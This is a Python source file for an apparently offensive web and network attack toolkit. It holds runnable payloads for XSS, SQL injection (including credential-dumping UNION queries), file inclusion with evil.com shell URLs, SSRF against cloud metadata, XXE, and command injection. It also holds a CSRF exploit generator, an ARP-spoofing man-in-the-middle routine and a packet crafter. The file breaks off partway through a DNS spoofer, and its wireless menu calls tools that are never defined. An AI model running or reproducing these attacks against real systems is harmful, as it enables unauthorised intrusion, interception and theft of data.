#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Coded by @rootkitov

import os
import sys
import time
import socket
import subprocess
import requests
import urllib.parse
from bs4 import BeautifulSoup
import scapy.all as scapy
import netifaces
import threading
from colorama import Fore, Style, init
import xml.etree.ElementTree as ET
import random
import string
import sqlite3
import hashlib
import readline  


init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    RESET = Style.RESET_ALL

class Banner:
    @staticmethod
    def display():
        print(f"""{Colors.RED}
   ▄████████  ▄██████▄   ▄█        ▄█        ▄██████▄     ▄████████    ▄████████ 
  ███    ███ ███    ███ ███       ███       ███    ███   ███    ███   ███    ███ 
  ███    █▀  ███    ███ ███       ███       ███    ███   ███    ███   ███    █▀  
  ███        ███    ███ ███       ███       ███    ███  ▄███▄▄▄▄██▀   ███        
▀███████████ ███    ███ ███       ███       ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ 
         ███ ███    ███ ███       ███       ███    ███ ▀███████████          ███ 
   ▄█    ███ ███    ███ ███▌    ▄ ███▌    ▄ ███    ███   ███    ███    ▄█    ███ 
 ▄████████▀   ▀██████▀  █████▄▄██ █████▄▄██  ▀██████▀    ███    ███  ▄████████▀  
                        ▀         ▀                      ███    ███              
{Colors.RESET}""")
        print(f"{Colors.CYAN}Advanced Web & Network Pentesting Toolkit{Colors.RESET}")
        print(f"{Colors.YELLOW}Coded by @rootkitov | v2.4.1{Colors.RESET}\n")

class Menu:
    @staticmethod
    def main_menu():
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            Banner.display()
            print(f"{Colors.WHITE}Main Menu:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Web Application Testing")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Network Security Tools")
            print(f"{Colors.GREEN}[3]{Colors.RESET} Wireless Audit Tools")
            print(f"{Colors.GREEN}[4]{Colors.RESET} About & Help")
            print(f"{Colors.RED}[0]{Colors.RESET} Exit")
            
            choice = input(f"\n{Colors.YELLOW}Select an option:{Colors.RESET} ")
            
            if choice == "1":
                Menu.web_menu()
            elif choice == "2":
                Menu.network_menu()
            elif choice == "3":
                Menu.wireless_menu()
            elif choice == "4":
                Menu.about()
            elif choice == "0":
                print(f"\n{Colors.BLUE}[*]{Colors.RESET} Exiting...")
                sys.exit(0)
            else:
                print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid option!")
                time.sleep(1)

    @staticmethod
    def web_menu():
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            Banner.display()
            print(f"{Colors.WHITE}Web Application Testing:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} XSS Scanner")
            print(f"{Colors.GREEN}[2]{Colors.RESET} SQL Injection Tester")
            print(f"{Colors.GREEN}[3]{Colors.RESET} LFI/RFI Scanner")
            print(f"{Colors.GREEN}[4]{Colors.RESET} CSRF Exploiter")
            print(f"{Colors.GREEN}[5]{Colors.RESET} SSRF Tester")
            print(f"{Colors.GREEN}[6]{Colors.RESET} XXE Injection")
            print(f"{Colors.GREEN}[7]{Colors.RESET} Command Injection")
            print(f"{Colors.GREEN}[8]{Colors.RESET} Back to Main Menu")
            
            choice = input(f"\n{Colors.YELLOW}Select an option:{Colors.RESET} ")
            
            if choice == "1":
                XSSScanner.run()
            elif choice == "2":
                SQLiTester.run()
            elif choice == "3":
                LFIRFIScanner.run()
            elif choice == "4":
                CSRFTester.run()
            elif choice == "5":
                SSRFScanner.run()
            elif choice == "6":
                XXETester.run()
            elif choice == "7":
                CommandInjectionTester.run()
            elif choice == "8":
                return
            else:
                print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid option!")
                time.sleep(1)

    @staticmethod
    def network_menu():
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            Banner.display()
            print(f"{Colors.WHITE}Network Security Tools:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Port Scanner")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Network Sniffer")
            print(f"{Colors.GREEN}[3]{Colors.RESET} MITM Attack (ARP Spoofing)")
            print(f"{Colors.GREEN}[4]{Colors.RESET} Packet Crafting")
            print(f"{Colors.GREEN}[5]{Colors.RESET} DNS Spoofer")
            print(f"{Colors.GREEN}[6]{Colors.RESET} Back to Main Menu")
            
            choice = input(f"\n{Colors.YELLOW}Select an option:{Colors.RESET} ")
            
            if choice == "1":
                PortScanner.run()
            elif choice == "2":
                NetworkSniffer.run()
            elif choice == "3":
                MITMAttack.run()
            elif choice == "4":
                PacketCrafter.run()
            elif choice == "5":
                DNSSpoofer.run()
            elif choice == "6":
                return
            else:
                print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid option!")
                time.sleep(1)

    @staticmethod
    def wireless_menu():
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            Banner.display()
            print(f"{Colors.WHITE}Wireless Audit Tools:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} WiFi Scanner")
            print(f"{Colors.GREEN}[2]{Colors.RESET} WPA Handshake Capture")
            print(f"{Colors.GREEN}[3]{Colors.RESET} WPS PIN Attack")
            print(f"{Colors.GREEN}[4]{Colors.RESET} Evil Twin Attack")
            print(f"{Colors.GREEN}[5]{Colors.RESET} Deauthentication Attack")
            print(f"{Colors.GREEN}[6]{Colors.RESET} Back to Main Menu")
            
            choice = input(f"\n{Colors.YELLOW}Select an option:{Colors.RESET} ")
            
            if choice == "1":
                WiFiScanner.run()
            elif choice == "2":
                WPAHandshakeCapture.run()
            elif choice == "3":
                WPSPINAttack.run()
            elif choice == "4":
                EvilTwinAttack.run()
            elif choice == "5":
                DeauthAttack.run()
            elif choice == "6":
                return
            else:
                print(f"\n{Colors.RED}[!]{Colors.RESET} Invalid option!")
                time.sleep(1)

    @staticmethod
    def about():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}About Pentest Toolkit:{Colors.RESET}")
        print(f"{Colors.CYAN}Version:{Colors.RESET} 2.4.1")
        print(f"{Colors.CYAN}Author:{Colors.RESET} @rootkitov")
        print(f"{Colors.CYAN}Description:{Colors.RESET}")
        print("Comprehensive security toolkit for web application and network penetration testing.")
        print("Includes tools for detecting and exploiting OWASP Top 10 vulnerabilities and")
        print("various network security assessment tools.")
        print("\nFor educational purposes only. Use responsibly and with permission.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class XSSScanner:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}XSS Scanner:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        params = input(f"{Colors.YELLOW}Enter parameters to test (comma separated):{Colors.RESET} ").split(',')
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting XSS scan on {url}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "'><svg/onload=alert('XSS')>",
            "\"<script>alert('XSS')</script>"
        ]
        
        vulnerable = False
        
        for param in params:
            param = param.strip()
            for payload in payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    if payload in response.text:
                        print(f"{Colors.RED}[!]{Colors.RESET} Potential XSS found in parameter: {param}")
                        print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                        vulnerable = True
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No XSS vulnerabilities found in the tested parameters.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class SQLiTester:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}SQL Injection Tester:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        params = input(f"{Colors.YELLOW}Enter parameters to test (comma separated):{Colors.RESET} ").split(',')
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting SQL injection test on {url}")
        
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1#",
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT 1,@@version,3--"
        ]
        
        vulnerable = False
        
        for param in params:
            param = param.strip()
            for payload in payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    error_messages = [
                        "SQL syntax",
                        "MySQL server",
                        "ORA-",
                        "syntax error",
                        "unclosed quotation mark",
                        "SQL Server",
                        "PostgreSQL",
                        "MariaDB",
                        "ODBC",
                        "JDBC",
                        "DB2",
                        "SQLite"
                    ]
                    
                    for error in error_messages:
                        if error.lower() in response.text.lower():
                            print(f"{Colors.RED}[!]{Colors.RESET} Potential SQLi found in parameter: {param}")
                            print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                            print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                            vulnerable = True
                            break
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No SQL injection vulnerabilities found in the tested parameters.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class LFIRFIScanner:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}LFI/RFI Scanner:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        params = input(f"{Colors.YELLOW}Enter parameters to test (comma separated):{Colors.RESET} ").split(',')
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting LFI/RFI test on {url}")
        
        lfi_payloads = [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/hosts",
            "../../../../../../../../windows/win.ini",
            "../../../../../../../../windows/system.ini",
            "....//....//....//....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
            "https://raw.githubusercontent.com/evil/shell/master/shell.txt"
        ]
        
        vulnerable = False
        
        for param in params:
            param = param.strip()
            
            # Test for LFI
            for payload in lfi_payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    if "root:" in response.text or "[extensions]" in response.text or "[mail]" in response.text:
                        print(f"{Colors.RED}[!]{Colors.RESET} Potential LFI found in parameter: {param}")
                        print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                        vulnerable = True
                        break
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
            
            # Test for RFI
            for payload in rfi_payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    if "evil.com" in response.text or "<?php" in response.text:
                        print(f"{Colors.RED}[!]{Colors.RESET} Potential RFI found in parameter: {param}")
                        print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                        vulnerable = True
                        break
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No LFI/RFI vulnerabilities found in the tested parameters.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class CSRFTester:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}CSRF Exploiter:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        method = input(f"{Colors.YELLOW}Enter HTTP method (GET/POST):{Colors.RESET} ").upper()
        params = input(f"{Colors.YELLOW}Enter parameters (name=value&name2=value2):{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Generating CSRF exploit...")
        
        if method == "GET":
            exploit_url = f"{url}?{params}"
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} GET-based CSRF exploit:")
            print(f"{Colors.YELLOW}URL:{Colors.RESET} {exploit_url}")
            print(f"\n{Colors.CYAN}HTML Payload:{Colors.RESET}")
            print(f"""<img src="{exploit_url}" width="0" height="0" />""")
        
        elif method == "POST":
            print(f"\n{Colors.GREEN}[+]{Colors.RESET} POST-based CSRF exploit:")
            print(f"{Colors.YELLOW}Target URL:{Colors.RESET} {url}")
            print(f"\n{Colors.CYAN}HTML Payload:{Colors.RESET}")
            print(f"""<form action="{url}" method="POST">""")
            for pair in params.split('&'):
                name, value = pair.split('=')
                print(f"""<input type="hidden" name="{name}" value="{value}" />""")
            print("""</form>
<script>document.forms[0].submit();</script>""")
        
        else:
            print(f"{Colors.RED}[!]{Colors.RESET} Invalid HTTP method. Use GET or POST.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class SSRFScanner:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}SSRF Tester:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        params = input(f"{Colors.YELLOW}Enter parameters to test (comma separated):{Colors.RESET} ").split(',')
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting SSRF test on {url}")
        
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://[::1]",
            "dict://localhost:6379/info"
        ]
        
        vulnerable = False
        
        for param in params:
            param = param.strip()
            for payload in payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    if "root:" in response.text or "AMI ID" in response.text or "redis_version" in response.text:
                        print(f"{Colors.RED}[!]{Colors.RESET} Potential SSRF found in parameter: {param}")
                        print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                        vulnerable = True
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No SSRF vulnerabilities found in the tested parameters.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class XXETester:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}XXE Injection Tester:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting XXE test on {url}")
        
        payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo>test</foo>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe"> %xxe;]><foo>test</foo>"""
        ]
        
        vulnerable = False
        
        headers = {'Content-Type': 'application/xml'}
        
        for payload in payloads:
            try:
                response = requests.post(url, data=payload, headers=headers, timeout=10)
                
                if "root:" in response.text or "evil.com" in response.text:
                    print(f"{Colors.RED}[!]{Colors.RESET} Potential XXE vulnerability found")
                    print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload[:100]}...")
                    print(f"{Colors.YELLOW}Response contains:{Colors.RESET} {response.text[:200]}...\n")
                    vulnerable = True
                
            except Exception as e:
                print(f"{Colors.RED}[!]{Colors.RESET} Error testing XXE: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No XXE vulnerabilities found.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class CommandInjectionTester:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Command Injection Tester:{Colors.RESET}")
        
        url = input(f"{Colors.YELLOW}Enter target URL (include http/https):{Colors.RESET} ")
        params = input(f"{Colors.YELLOW}Enter parameters to test (comma separated):{Colors.RESET} ").split(',')
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting command injection test on {url}")
        
        payloads = [
            ";id",
            "|id",
            "&&id",
            "||id",
            "`id`",
            "$(id)",
            "';id;'",
            "\";id;\""
        ]
        
        vulnerable = False
        
        for param in params:
            param = param.strip()
            for payload in payloads:
                try:
                    if '?' in url:
                        test_url = url + "&" + param + "=" + urllib.parse.quote(payload)
                    else:
                        test_url = url + "?" + param + "=" + urllib.parse.quote(payload)
                    
                    response = requests.get(test_url, timeout=10)
                    
                    if "uid=" in response.text or "gid=" in response.text or "groups=" in response.text:
                        print(f"{Colors.RED}[!]{Colors.RESET} Potential command injection found in parameter: {param}")
                        print(f"{Colors.YELLOW}Payload:{Colors.RESET} {payload}")
                        print(f"{Colors.YELLOW}URL:{Colors.RESET} {test_url}\n")
                        vulnerable = True
                    
                except Exception as e:
                    print(f"{Colors.RED}[!]{Colors.RESET} Error testing parameter {param}: {str(e)}")
        
        if not vulnerable:
            print(f"{Colors.GREEN}[+]{Colors.RESET} No command injection vulnerabilities found in the tested parameters.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class PortScanner:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Port Scanner:{Colors.RESET}")
        
        target = input(f"{Colors.YELLOW}Enter target IP or hostname:{Colors.RESET} ")
        port_range = input(f"{Colors.YELLOW}Enter port range (e.g., 1-1000):{Colors.RESET} ")
        
        try:
            start_port, end_port = map(int, port_range.split('-'))
        except ValueError:
            print(f"{Colors.RED}[!]{Colors.RESET} Invalid port range format. Use START-END (e.g., 1-1000)")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Scanning {target} from port {start_port} to {end_port}")
        
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    print(f"{Colors.GREEN}[+]{Colors.RESET} Port {port} ({service}) is open")
                sock.close()
            except:
                pass
        
        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        if not open_ports:
            print(f"{Colors.RED}[-]{Colors.RESET} No open ports found in the specified range.")
        else:
            print(f"\n{Colors.CYAN}[*]{Colors.RESET} Scan complete. Open ports: {', '.join(map(str, open_ports))}")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class NetworkSniffer:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Network Sniffer:{Colors.RESET}")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Starting network sniffer (Ctrl+C to stop)")
        
        def packet_callback(packet):
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                proto = packet[scapy.IP].proto
                
                if packet.haslayer(scapy.TCP):
                    sport = packet[scapy.TCP].sport
                    dport = packet[scapy.TCP].dport
                    print(f"{Colors.YELLOW}TCP{Colors.RESET} {src_ip}:{sport} -> {dst_ip}:{dport}")
                
                elif packet.haslayer(scapy.UDP):
                    sport = packet[scapy.UDP].sport
                    dport = packet[scapy.UDP].dport
                    print(f"{Colors.CYAN}UDP{Colors.RESET} {src_ip}:{sport} -> {dst_ip}:{dport}")
                
                elif packet.haslayer(scapy.ICMP):
                    print(f"{Colors.MAGENTA}ICMP{Colors.RESET} {src_ip} -> {dst_ip}")
        
        try:
            scapy.sniff(prn=packet_callback, store=0)
        except KeyboardInterrupt:
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Sniffer stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class MITMAttack:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}MITM Attack (ARP Spoofing):{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        target_ip = input(f"{Colors.YELLOW}Enter target IP:{Colors.RESET} ")
        gateway_ip = input(f"{Colors.YELLOW}Enter gateway IP:{Colors.RESET} ")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        print(f"{Colors.BLUE}[*]{Colors.RESET} Starting ARP spoofing (Ctrl+C to stop)")
        
        def restore_network(target_ip, gateway_ip):
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} Restoring ARP tables...")
            target_mac = get_mac(target_ip)
            gateway_mac = get_mac(gateway_ip)
            
            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                               psrc=target_ip, hwsrc=target_mac), count=5)
            scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                               psrc=gateway_ip, hwsrc=gateway_mac), count=5)
            
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            
            return answered[0][1].hwsrc
        
        def spoof(target_ip, spoof_ip):
            target_mac = get_mac(target_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        
        try:
            while True:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            restore_network(target_ip, gateway_ip)
            print(f"\n{Colors.BLUE}[*]{Colors.RESET} MITM attack stopped.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class PacketCrafter:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}Packet Crafter:{Colors.RESET}")
        
        print(f"\n{Colors.BLUE}[*]{Colors.RESET} Packet crafting options:")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Craft TCP Packet")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Craft UDP Packet")
        print(f"{Colors.GREEN}[3]{Colors.RESET} Craft ICMP Packet")
        print(f"{Colors.GREEN}[4]{Colors.RESET} Custom Packet")
        
        choice = input(f"\n{Colors.YELLOW}Select an option:{Colors.RESET} ")
        
        if choice == "1":
            src_ip = input(f"{Colors.YELLOW}Enter source IP:{Colors.RESET} ")
            dst_ip = input(f"{Colors.YELLOW}Enter destination IP:{Colors.RESET} ")
            src_port = int(input(f"{Colors.YELLOW}Enter source port:{Colors.RESET} "))
            dst_port = int(input(f"{Colors.YELLOW}Enter destination port:{Colors.RESET} "))
            payload = input(f"{Colors.YELLOW}Enter payload (leave empty for none):{Colors.RESET} ")
            
            packet = scapy.IP(src=src_ip, dst=dst_ip)/scapy.TCP(sport=src_port, dport=dst_port)/payload
            print(f"\n{Colors.CYAN}[*]{Colors.RESET} Crafted TCP packet:")
            print(packet.summary())
            
            send = input(f"\n{Colors.YELLOW}Send packet? (y/n):{Colors.RESET} ").lower()
            if send == "y":
                scapy.send(packet)
                print(f"{Colors.GREEN}[+]{Colors.RESET} Packet sent.")
        
        elif choice == "2":
            src_ip = input(f"{Colors.YELLOW}Enter source IP:{Colors.RESET} ")
            dst_ip = input(f"{Colors.YELLOW}Enter destination IP:{Colors.RESET} ")
            src_port = int(input(f"{Colors.YELLOW}Enter source port:{Colors.RESET} "))
            dst_port = int(input(f"{Colors.YELLOW}Enter destination port:{Colors.RESET} "))
            payload = input(f"{Colors.YELLOW}Enter payload (leave empty for none):{Colors.RESET} ")
            
            packet = scapy.IP(src=src_ip, dst=dst_ip)/scapy.UDP(sport=src_port, dport=dst_port)/payload
            print(f"\n{Colors.CYAN}[*]{Colors.RESET} Crafted UDP packet:")
            print(packet.summary())
            
            send = input(f"\n{Colors.YELLOW}Send packet? (y/n):{Colors.RESET} ").lower()
            if send == "y":
                scapy.send(packet)
                print(f"{Colors.GREEN}[+]{Colors.RESET} Packet sent.")
        
        elif choice == "3":
            src_ip = input(f"{Colors.YELLOW}Enter source IP:{Colors.RESET} ")
            dst_ip = input(f"{Colors.YELLOW}Enter destination IP:{Colors.RESET} ")
            payload = input(f"{Colors.YELLOW}Enter payload (leave empty for none):{Colors.RESET} ")
            
            packet = scapy.IP(src=src_ip, dst=dst_ip)/scapy.ICMP()/payload
            print(f"\n{Colors.CYAN}[*]{Colors.RESET} Crafted ICMP packet:")
            print(packet.summary())
            
            send = input(f"\n{Colors.YELLOW}Send packet? (y/n):{Colors.RESET} ").lower()
            if send == "y":
                scapy.send(packet)
                print(f"{Colors.GREEN}[+]{Colors.RESET} Packet sent.")
        
        elif choice == "4":
            print(f"\n{Colors.YELLOW}Enter packet layers in order (e.g., IP/TCP/Raw):{Colors.RESET}")
            print("Available layers: Ether, IP, IPv6, ARP, TCP, UDP, ICMP, Raw")
            layers = input(f"{Colors.YELLOW}Enter layers (separated by /):{Colors.RESET} ").split('/')
            
            packet = None
            for layer in layers:
                layer = layer.strip().lower()
                if layer == "ether":
                    if packet is None:
                        packet = scapy.Ether()
                    else:
                        packet = packet/scapy.Ether()
                elif layer == "ip":
                    if packet is None:
                        packet = scapy.IP()
                    else:
                        packet = packet/scapy.IP()
                elif layer == "ipv6":
                    if packet is None:
                        packet = scapy.IPv6()
                    else:
                        packet = packet/scapy.IPv6()
                elif layer == "arp":
                    if packet is None:
                        packet = scapy.ARP()
                    else:
                        packet = packet/scapy.ARP()
                elif layer == "tcp":
                    if packet is None:
                        packet = scapy.TCP()
                    else:
                        packet = packet/scapy.TCP()
                elif layer == "udp":
                    if packet is None:
                        packet = scapy.UDP()
                    else:
                        packet = packet/scapy.UDP()
                elif layer == "icmp":
                    if packet is None:
                        packet = scapy.ICMP()
                    else:
                        packet = packet/scapy.ICMP()
                elif layer == "raw":
                    payload = input(f"{Colors.YELLOW}Enter raw payload:{Colors.RESET} ")
                    if packet is None:
                        packet = scapy.Raw(load=payload)
                    else:
                        packet = packet/scapy.Raw(load=payload)
            
            print(f"\n{Colors.CYAN}[*]{Colors.RESET} Crafted custom packet:")
            print(packet.summary())
            
            send = input(f"\n{Colors.YELLOW}Send packet? (y/n):{Colors.RESET} ").lower()
            if send == "y":
                scapy.send(packet)
                print(f"{Colors.GREEN}[+]{Colors.RESET} Packet sent.")
        
        else:
            print(f"{Colors.RED}[!]{Colors.RESET} Invalid option.")
        
        input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")

class DNSSpoofer:
    @staticmethod
    def run():
        os.system('clear' if os.name == 'posix' else 'cls')
        Banner.display()
        print(f"{Colors.WHITE}DNS Spoofer:{Colors.RESET}")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!]{Colors.RESET} This tool requires root privileges.")
            input(f"\n{Colors.YELLOW}Press Enter to return...{Colors.RESET}")
            return
        
        target_domain = input(f"{Colors.YELLOW}Enter domain to spoof:{Colors.RESET} ")
        spoof_ip = input(f"{Colors.YELLOW}Enter IP to redirect to:{Colors.RESET} ")
